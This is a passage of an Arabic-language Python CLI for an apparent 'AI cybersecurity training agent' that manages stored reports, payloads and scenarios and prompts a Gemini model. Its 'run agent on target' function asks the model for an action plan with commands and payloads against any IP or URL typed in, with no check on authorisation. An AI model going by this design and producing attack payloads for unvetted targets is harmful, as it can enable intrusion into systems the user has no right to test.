        "You are an Elite AI Cybersecurity Training Agent. "
        "You provide advanced penetration testing analysis, vulnerability assessment, "
        "and security recommendations. You are an expert in Red Team and Blue Team operations. "
        "Respond in Arabic with English technical terms in parentheses. "
        "Be thorough, professional, and educational."
    )

    try:
        model = genai.GenerativeModel(
            model_name=MODEL_NAME,
            system_instruction=system_instruction
        )

        response = model.generate_content(prompt)

        print("\n" + "="*70)
        print(f"\033[92m[+] === {title} ===\033[0m")
        print("="*70)
        print(response.text)
        print("="*70 + "\n")

        # حفظ التقرير
        save_choice = input("\033[93m[*] هل تريد حفظ هذا التقرير؟ (y/n): \033[0m").strip().lower()
        if save_choice == 'y':
            report_name = input("\033[93m[*] اسم الملف (بدون امتداد): \033[0m").strip()
            if report_name:
                report_path = REPORTS_DIR / f"{report_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_path, "w", encoding="utf-8") as f:
                    f.write(f"=== {title} ===\n")
                    f.write(f"التاريخ: {datetime.now().isoformat()}\n")
                    f.write("="*70 + "\n\n")
                    f.write(response.text)
                print(f"\033[92m[+] تم حفظ التقرير في: {report_path}\033[0m")

    except Exception as e:
        print(f"\033[91m[-] خطأ في تشغيل الذكاء الاصطناعي: {e}\033[0m")

# ═══════════════════════════════════════════════════════════════════════════════
# 8. انشاء تقارير تدريبية شاملة
# ═══════════════════════════════════════════════════════════════════════════════

def generate_comprehensive_report():
    """انشاء تقرير تدريبي شامل"""
    print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                  \033[97mانشاء تقرير تدريبي شامل - Training Report                  \033[94m║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m\n")

    print("\033[93m[*] اختر المجال للتقرير:\033[0m")
    for key, domain in TRAINING_DOMAINS.items():
        print(f"  [{key}] {domain['icon']} {domain['name_ar']}")
    print("  [11] جميع المجالات (All Domains)")

    choice = input("\n\033[93m[*] اختر المجال (1-11): \033[0m").strip()

    if choice == "11":
        generate_all_domains_report()
    elif choice in TRAINING_DOMAINS:
        generate_single_domain_report(choice)
    else:
        print("\033[91m[-] اختيار غير صحيح!\033[0m")

def generate_single_domain_report(domain_key):
    """انشاء تقرير لمجال واحد"""
    domain = TRAINING_DOMAINS[domain_key]
    data = load_training_data(domain_key)

    report_content = f"""
{'='*80}
    تقرير تدريبي شامل: {domain['name_ar']}
    {domain['name_en']}
{'='*80}

التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
الادوات المستخدمة: {', '.join(domain['tools'])}

────────────────────────────────────────────────────────────────────────────────
                        القسم الاول: التقارير التدريبية
────────────────────────────────────────────────────────────────────────────────
"""

    for i, report in enumerate(data.get("reports", []), 1):
        report_content += f"""
--- التقرير #{i}: {report['title']} ---
النوع: {report['type']}
التاريخ: {report['date']}
الادوات: {', '.join(report.get('tools_used', []))}

{report['content']}

"""

    report_content += """
────────────────────────────────────────────────────────────────────────────────
                        القسم الثاني: البايلودات
────────────────────────────────────────────────────────────────────────────────
"""

    for i, payload in enumerate(data.get("payloads", []), 1):
        report_content += f"""
--- البايلود #{i}: {payload['title']} ---

{payload['content']}

"""

    report_content += """
────────────────────────────────────────────────────────────────────────────────
                        القسم الثالث: السيناريوهات
────────────────────────────────────────────────────────────────────────────────
"""

    for i, scenario in enumerate(data.get("scenarios", []), 1):
        report_content += f"""
--- السيناريو #{i}: {scenario['title']} ---

{scenario['content']}

"""

    report_content += f"""
{'='*80}
                            نهاية التقرير
{'='*80}
"""

    # حفظ التقرير
    filename = f"training_report_{domain['file']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    report_path = REPORTS_DIR / filename

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(report_content)

    print(f"\n\033[92m[+] تم انشاء التقرير بنجاح!\033[0m")
    print(f"\033[92m[+] المسار: {report_path}\033[0m")
    print(f"\033[92m[+] عدد التقارير: {len(data.get('reports', []))}\033[0m")
    print(f"\033[92m[+] عدد البايلودات: {len(data.get('payloads', []))}\033[0m")
    print(f"\033[92m[+] عدد السيناريوهات: {len(data.get('scenarios', []))}\033[0m")

def generate_all_domains_report():
    """انشاء تقرير شامل لجميع المجالات"""
    print("\033[93m[*] جاري انشاء التقرير الشامل لجميع المجالات...\033[0m")

    report_content = f"""
{'='*80}
    التقرير التدريبي الشامل للامن السيبراني
    Comprehensive Cybersecurity Training Report
{'='*80}

التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
اجمالي المجالات: {len(TRAINING_DOMAINS)}

"""

    for key, domain in TRAINING_DOMAINS.items():
        data = load_training_data(key)
        report_content += f"""
{'─'*80}
المجال [{key}]: {domain['name_ar']}
{'─'*80}
الادوات: {', '.join(domain['tools'])}
عدد التقارير: {len(data.get('reports', []))}
عدد البايلودات: {len(data.get('payloads', []))}
عدد السيناريوهات: {len(data.get('scenarios', []))}

"""

        for report in data.get("reports", [])[:2]:
            report_content += f"  • {report['title']}\n"
        for payload in data.get("payloads", [])[:2]:
            report_content += f"  • [بايلود] {payload['title']}\n"

    report_content += f"""
{'='*80}
                            نهاية التقرير الشامل
{'='*80}
"""

    filename = f"comprehensive_training_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    report_path = REPORTS_DIR / filename

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(report_content)

    print(f"\033[92m[+] تم انشاء التقرير الشامل!\033[0m")
    print(f"\033[92m[+] المسار: {report_path}\033[0m")

# ═══════════════════════════════════════════════════════════════════════════════
# 9. ادارة قاعدة بيانات التدريب
# ═══════════════════════════════════════════════════════════════════════════════

def training_database_manager():
    """ادارة قاعدة بيانات التدريب"""
    while True:
        print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║              \033[97mادارة قاعدة بيانات التدريب - Training Database                \033[94m║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣\033[0m")
        print("  \033[97m[1] عرض جميع التقارير (View All Reports)")
        print("  \033[97m[2] اضافة تقرير جديد (Add New Report)")
        print("  \033[97m[3] حذف تقرير (Delete Report)")
        print("  \033[97m[4] انشاء قوالب جاهزة (Generate Templates)")
        print("  \033[97m[5] احصائيات قاعدة البيانات (Statistics)")
        print("  \033[91m[0] رجوع (Back)")
        print("\033[94m╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m")

        choice = input("\033[93m[*] اختر عملية (0-5): \033[0m").strip()

        if choice == "0":
            break
        elif choice == "1":
            view_all_reports()
        elif choice == "2":
            add_new_report_menu()
        elif choice == "3":
            delete_report()
        elif choice == "4":
            count = generate_training_templates()
            print(f"\033[92m[+] تم انشاء {count} قالب تدريبي جديد!\033[0m")
        elif choice == "5":
            show_statistics()
        else:
            print("\033[91m[-] اختيار غير صحيح!\033[0m")

def view_all_reports():
    """عرض جميع التقارير"""
    print("\n\033[94m=== جميع التقارير ===\033[0m")
    for key, domain in TRAINING_DOMAINS.items():
        data = load_training_data(key)
        total = len(data.get("reports", [])) + len(data.get("payloads", [])) + len(data.get("scenarios", []))
        if total > 0:
            print(f"\n\033[96m[{key}] {domain['name_ar']} ({total} عنصر)\033[0m")
            for i, r in enumerate(data.get("reports", []), 1):
                print(f"  \033[97m  Report {i}: {r['title']}\033[0m")
            for i, p in enumerate(data.get("payloads", []), 1):
                print(f"  \033[93m  Payload {i}: {p['title']}\033[0m")
            for i, s in enumerate(data.get("scenarios", []), 1):
                print(f"  \033[92m  Scenario {i}: {s['title']}\033[0m")

def add_new_report_menu():
    """قائمة اضافة تقرير جديد"""
    print("\n\033[93m[*] اختر المجال:\033[0m")
    for key, domain in TRAINING_DOMAINS.items():
        print(f"  [{key}] {domain['icon']} {domain['name_ar']}")

    domain_choice = input("\033[93m[*] اختر المجال (1-10): \033[0m").strip()
    if domain_choice in TRAINING_DOMAINS:
        add_training_report(domain_choice)
    else:
        print("\033[91m[-] اختيار غير صحيح!\033[0m")

def delete_report():
    """حذف تقرير"""
    print("\n\033[93m[*] اختر المجال:\033[0m")
    for key, domain in TRAINING_DOMAINS.items():
        print(f"  [{key}] {domain['name_ar']}")

    domain_choice = input("\033[93m[*] اختر المجال (1-10): \033[0m").strip()
    if domain_choice not in TRAINING_DOMAINS:
        print("\033[91m[-] اختيار غير صحيح!\033[0m")
        return

    data = load_training_data(domain_choice)
    all_items = []

    for i, r in enumerate(data.get("reports", [])):
        all_items.append(("report", i, r['title']))
    for i, p in enumerate(data.get("payloads", [])):
        all_items.append(("payload", i, p['title']))
    for i, s in enumerate(data.get("scenarios", [])):
        all_items.append(("scenario", i, s['title']))

    if not all_items:
        print("\033[91m[-] لا توجد تقارير في هذا المجال!\033[0m")
        return

    print("\n\033[94m=== التقارير المتاحة ===\033[0m")
    for idx, (rtype, orig_idx, title) in enumerate(all_items, 1):
        print(f"  [{idx}] [{rtype}] {title}")

    del_choice = input("\033[93m[*] اختر رقم التقرير للحذف: \033[0m").strip()
    try:
        del_idx = int(del_choice) - 1
        if 0 <= del_idx < len(all_items):
            rtype, orig_idx, title = all_items[del_idx]
            if rtype == "report":
                del data["reports"][orig_idx]
            elif rtype == "payload":
                del data["payloads"][orig_idx]
            else:
                del data["scenarios"][orig_idx]
            save_training_data(domain_choice, data)
            print(f"\033[92m[+] تم حذف: {title}\033[0m")
    except (ValueError, IndexError):
        print("\033[91m[-] رقم غير صحيح!\033[0m")

def show_statistics():
    """عرض احصائيات"""
    print("\n\033[94m╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                      \033[97mاحصائيات قاعدة البيانات                               \033[94m║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣\033[0m")

    total_reports = 0
    total_payloads = 0
    total_scenarios = 0

    for key, domain in TRAINING_DOMAINS.items():
        data = load_training_data(key)
        reports = len(data.get("reports", []))
        payloads = len(data.get("payloads", []))
        scenarios = len(data.get("scenarios", []))
        total = reports + payloads + scenarios

        total_reports += reports
        total_payloads += payloads
        total_scenarios += scenarios

        if total > 0:
            print(f"  \033[97m{domain['icon']} {domain['name_ar']:<40} \033[92m{total}\033[0m")

    print("\033[94m╠═══════════════════════════════════════════════════════════════════════════════╣")
    print(f"  \033[97mاجمالي التقارير:     \033[92m{total_reports}\033[0m")
    print(f"  \033[97mاجمالي البايلودات:   \033[92m{total_payloads}\033[0m")
    print(f"  \033[97mاجمالي السيناريوهات: \033[92m{total_scenarios}\033[0m")
    print(f"  \033[97mالاجمالي الكلي:      \033[92m{total_reports + total_payloads + total_scenarios}\033[0m")
    print("\033[94m╚═══════════════════════════════════════════════════════════════════════════════╝\033[0m")

# ═══════════════════════════════════════════════════════════════════════════════
# 10. الدالة الرئيسية
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    if not initialize_gemini():
        print("\033[93m[*] سيتم تشغيل الوكيل في وضع التدريب فقط (بدون AI)...\033[0m")

    # انشاء القوالب اذا لم تكن موجودة
    if not any(TRAINING_DIR.glob("*.json")):
        print("\033[93m[*] انشاء قوالب تدريبية اولية...\033[0m")
        generate_training_templates()

    while True:
        print_banner()
        print_menu()

        choice = input("\033[93m[*] اختر رقم العملية: \033[0m").strip()

        if choice in TRAINING_DOMAINS:
            # عرض خيارات المجال
            print(f"\n\033[94m=== {TRAINING_DOMAINS[choice]['name_ar']} ===\033[0m")
            print("  [1] عرض التقارير التدريبية")
            print("  [2] اضافة تقرير/بايلود جديد")
            print("  [3] تشغيل الوكيل الذكي على هدف")
            print("  [0] رجوع")

            sub_choice = input("\033[93m[*] اختر: \033[0m").strip()
            if sub_choice == "1":
                view_domain_reports(choice)
            elif sub_choice == "2":
                add_training_report(choice)
            elif sub_choice == "3":
                run_domain_agent(choice)

        elif choice == "11":
            training_database_manager()
        elif choice == "12":
            run_ai_agent()
        elif choice == "13":
            generate_comprehensive_report()
        elif choice == "14":
            system_requirements_check()
        elif choice == "99":
            print("\n\033[92m[*] شكراً لاستخدام وكيل التدريب. بالتوفيق! (Happy Hacking)\033[0m\n")
            break
        else:
            print("\033[91m[-] اختيار غير صحيح!\033[0m")

        input("\n\033[90mاضغط Enter للعودة...\033[0m")
        os.system('clear' if os.name == 'posix' else 'cls')

def view_domain_reports(domain_key):
    """عرض تقارير مجال محدد"""
    data = load_training_data(domain_key)
    domain = TRAINING_DOMAINS[domain_key]

    print(f"\n\033[96m=== {domain['name_ar']} ===\033[0m")

    if data.get("reports"):
        print("\n\033[94m[التقارير]\033[0m")
        for i, r in enumerate(data["reports"], 1):
            print(f"  {i}. {r['title']}")

    if data.get("payloads"):
        print("\n\033[93m[البايلودات]\033[0m")
        for i, p in enumerate(data["payloads"], 1):
            print(f"  {i}. {p['title']}")

    if data.get("scenarios"):
        print("\n\033[92m[السيناريوهات]\033[0m")
        for i, s in enumerate(data["scenarios"], 1):
            print(f"  {i}. {s['title']}")

def run_domain_agent(domain_key):
    """تشغيل الوكيل على هدف في مجال محدد"""
    domain = TRAINING_DOMAINS[domain_key]
    print(f"\n\033[94m[*] تشغيل الوكيل على {domain['name_ar']}...\033[0m")

    target = input("\033[93m[*] ادخل الهدف (IP/URL/مسار): \033[0m").strip()
    if not target:
        print("\033[91m[-] الهدف فارغ!\033[0m")
        return

    # بناء Prompt مخصص للمجال
    training_context = build_training_context()

    prompt = f"""
=== المجال: {domain['name_ar']} ===
=== الهدف: {target} ===

=== الادوات المتاحة ===
{', '.join(domain['tools'])}

=== بيانات التدريب ===
{training_context[:10000]}

=== التعليمات ===
انت متخصص في {domain['name_ar']}. حلل الهدف وقدم:
1. خطة عمل مفصلة
2. الاوامر/البايلودات المناسبة
3. خطوات التنفيذ
4. التوصيات الامنية
الرد باللغة العربية.
"""

    generate_ai_response(prompt, f"تقرير {domain['name_ar']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[91m[-] تم الايقاف بواسطة المستخدم.\033[0m\n")
        sys.exit(0)
